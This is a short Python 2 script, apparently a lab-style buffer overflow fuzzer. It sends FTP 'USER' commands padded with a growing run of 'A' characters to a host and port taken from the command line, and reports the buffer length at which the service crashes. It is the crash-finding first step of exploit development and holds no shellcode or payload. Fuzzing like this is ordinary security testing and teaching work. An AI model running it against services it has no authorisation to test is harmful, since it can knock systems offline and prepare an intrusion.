import sys, socket
from time import sleep
import statuscc

RHOST = sys.argv[1]
RPORT = int(sys.argv[2])
# create string of 50 A's '\x41'
buff = '\x41' * 50

# loop through sending in a buffer with an increasing length by 50 A's
while True:
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((RHOST, RPORT))
        s.recv(1024)

        print statuscc.NEUTRAL + "Sending buffer with length: " + str(len(buff))
        s.send("USER " + buff + "\r\n")
        s.close()
        sleep(1)

        buff += '\x41' * 50

    except:
        print statuscc.POSITIVE + "Crash occured with buffer length: " + str(len(buff) - 50)
        sys.exit()